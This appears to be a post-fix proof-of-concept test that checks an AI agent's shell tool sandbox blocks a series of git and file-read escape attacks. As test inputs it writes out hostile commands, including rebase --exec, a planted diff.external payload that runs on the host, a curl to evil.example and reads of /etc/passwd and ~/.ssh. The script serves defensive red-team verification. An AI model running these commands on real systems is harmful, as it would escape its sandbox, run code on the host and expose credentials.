"""PoC (post-fix verification): shell allowlist git bypass — nested-repo RCE.

Original findings (all fixed; this script now asserts the BLOCKED outcomes):
  A) `_git_arg_error` detected the subcommand as the first non-dash token, so
     `git -C <dir> config ...` sailed past the deny list. Fixed by consuming
     valued options (-C/--git-dir/--work-tree/--namespace) and switching to a
     subcommand WHITELIST (config/rebase/init/... are all denied).
  B) The R3-2 `.git` write deny covered only the workspace root `.git`; nested
     repos were writable. Fixed: every `.git` component under the workspace is
     write-denied (SBPL deny rules / bwrap ro-bind).
  C) `diff.external` planted via (A)+(B) executed on the HOST's next git run.
     Fixed by (A) blocking the plant and (B) blocking the write.

Setup is done on the HOST (a pre-seeded hostile repo is part of the threat
model); attack steps go through the REAL ShellTool path and must all fail.
"""

from __future__ import annotations

import asyncio
import os
import subprocess
import sys
import tempfile
from pathlib import Path

REPO = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(REPO))

from js.config import SecurityConfig, ToolLimits  # noqa: E402
from js.security.guard import BehaviorGuard  # noqa: E402
from js.tools.shell import ShellTool  # noqa: E402

RESULTS: list[tuple[str, str, str]] = []


def record(case: str, verdict: str, detail: str) -> None:
    RESULTS.append((case, verdict, detail))
    print(f"[{verdict:>22}] {case}: {detail}")


def host_git(ws: Path, *args: str) -> None:
    """Set up the victim repo on the host (pre-seeded content)."""
    env = {k: v for k, v in os.environ.items() if not k.startswith("GIT_CONFIG_")}
    subprocess.run(
        ["git", "-C", str(ws), *args],
        capture_output=True, text=True, env=env, check=True,
    )


async def main() -> None:
    ws = Path(tempfile.mkdtemp(prefix="redteam-git-"))
    tool = ShellTool(ws, ToolLimits(), BehaviorGuard(SecurityConfig(), ws))

    # ---------------- controls (must stay blocked) ----------------
    r = await tool.execute("git config user.email evil@x")
    record("control: plain git config", "PASS" if not r.success else "FAIL",
           (r.error or "")[:90])
    r = await tool.execute("curl https://evil.example/")
    record("control: curl", "PASS" if not r.success else "FAIL", (r.error or "")[:90])

    # ---------------- host-side setup: pre-seeded nested repo --------------
    (ws / "nested").mkdir()
    host_git(ws, "init", "-q", "nested")
    (ws / "nested" / "f1.txt").write_text("one\n")
    host_git(ws / "nested", "-c", "user.email=a@b", "-c", "user.name=x",
             "add", "-A")
    host_git(ws / "nested", "-c", "user.email=a@b", "-c", "user.name=x",
             "commit", "-qm", "c1")
    (ws / "nested" / "f2.txt").write_text("two\n")
    host_git(ws / "nested", "-c", "user.email=a@b", "-c", "user.name=x",
             "add", "-A")
    host_git(ws / "nested", "-c", "user.email=a@b", "-c", "user.name=x",
             "commit", "-qm", "c2")
    config_before = (ws / "nested" / ".git" / "config").read_text()

    # ---------------- positive controls: whitelisted git still works -------
    r = await tool.execute("git -C nested status --short")
    record("git -C nested status (whitelist)", "PASS" if r.success else "FAIL",
           f"success={r.success} err={(r.error or '')[:90]}")
    r = await tool.execute("git -C nested log --oneline -2")
    record("git -C nested log (whitelist)", "PASS" if r.success else "FAIL",
           f"success={r.success} err={(r.error or '')[:90]}")

    # ---------------- A. -C no longer bypasses the subcommand gate ---------
    r = await tool.execute("git -C nested config user.email attacker@evil")
    record("git -C nested config ... (was: deny bypass)", "BLOCKED" if not r.success else "CONFIRMED",
           f"success={r.success} err={(r.error or '')[:90]}")

    r = await tool.execute("git -C nested rebase --exec 'touch SANDBOX_PWNED' HEAD~1")
    hit = (ws / "nested" / "SANDBOX_PWNED").exists()
    record("git -C nested rebase --exec <cmd>", "CONFIRMED-EXEC" if hit else "BLOCKED",
           f"success={r.success} marker={hit} err={(r.error or '')[:90]}")

    # ---------------- B. nested .git is write-denied at the OS layer -------
    r = await tool.execute("echo 'evil' >> nested/.git/config")
    planted = (ws / "nested" / ".git" / "config").read_text() != config_before
    record("shell redirect into nested .git/config",
           "CONFIRMED" if planted else "BLOCKED",
           f"success={r.success} config_modified={planted}")

    r = await tool.execute("git -C nested config diff.external 'sh payload.sh'")
    planted = (ws / "nested" / ".git" / "config").read_text() != config_before
    record("plant diff.external via -C (was: host exec)",
           "CONFIRMED" if planted else "BLOCKED",
           f"success={r.success} config_modified={planted}")

    # host simulation: the repo must be clean, so host git runs nothing
    env = {k: v for k, v in os.environ.items() if not k.startswith("GIT_CONFIG_")}
    (ws / "nested" / "payload.sh").write_text("#!/bin/sh\ntouch HOST_PWNED\n")
    subprocess.run(["git", "-C", str(ws / "nested"), "diff"],
                   capture_output=True, text=True, env=env)
    host_fired = (ws / "nested" / "HOST_PWNED").exists()
    record("HOST git diff on repo (nothing planted)", "CONFIRMED-HOST-EXEC" if host_fired else "REFUTED",
           f"marker={host_fired}")

    # ---------------- C. extra app-layer gaps ------------------------------
    r = await tool.execute("git send-email --confirm=never --to=poc@example.invalid HEAD~1", timeout=20)
    denied = not r.success
    record("git send-email app-layer", "BLOCKED" if denied else "ALLOWLIST-PASS",
           f"success={r.success} err={(r.error or '')[:60]}")

    r = await tool.execute("cat ${X:-/etc/passwd}")
    out = (r.output or "") + (r.error or "")
    record("cat ${X:-/etc/passwd}", "CONFIRMED-EXEC" if "root:" in out else "BLOCKED",
           out[:80].replace("\n", " "))

    r = await tool.execute("sort /etc/passwd")
    out = (r.output or "") + (r.error or "")
    record("sort /etc/passwd (positional path)", "CONFIRMED-EXEC" if "root:" in out else "BLOCKED",
           out[:80].replace("\n", " "))

    r = await tool.execute("stat /etc/passwd")
    record("stat /etc/passwd", "LEAK" if r.success else "BLOCKED", (r.error or "")[:60])
    r = await tool.execute(f"stat {Path.home() / '.ssh'}")
    record("stat ~/.ssh", "LEAK" if r.success else "BLOCKED", (r.error or "")[:60])

    # ---------------- D. model-supplied timeout is clamped -----------------
    captured: dict[str, float | None] = {}

    real_execute = tool.executor.execute

    async def capture_execute(*args: object, **kwargs: object) -> object:
        captured["timeout"] = kwargs.get("timeout")  # type: ignore[typeddict-item]
        return await real_execute(*args, **kwargs)  # type: ignore[arg-type]

    tool.executor.execute = capture_execute  # type: ignore[method-assign]
    await tool.execute("echo ok", timeout=100_000_000)
    tool.executor.execute = real_execute  # type: ignore[method-assign]
    clamped = captured.get("timeout") == float(ToolLimits().shell_timeout)
    record("timeout=1e8 clamped to configured ceiling", "REFUTED" if clamped else "CONFIRMED",
           f"effective timeout seen by executor: {captured.get('timeout')}")

    print("\n=== SUMMARY ===")
    bad = {"CONFIRMED", "CONFIRMED-EXEC", "CONFIRMED-HOST-EXEC", "LEAK", "FAIL",
           "ALLOWLIST-PASS"}
    failures = [case for case, verdict, _ in RESULTS if verdict in bad]
    for case, verdict, _ in RESULTS:
        print(f"  {verdict:>22}  {case}")
    print("\n" + ("ATTACKS REMAIN: " + ", ".join(failures) if failures else "ALL ATTACKS BLOCKED"))


if __name__ == "__main__":
    asyncio.run(main())
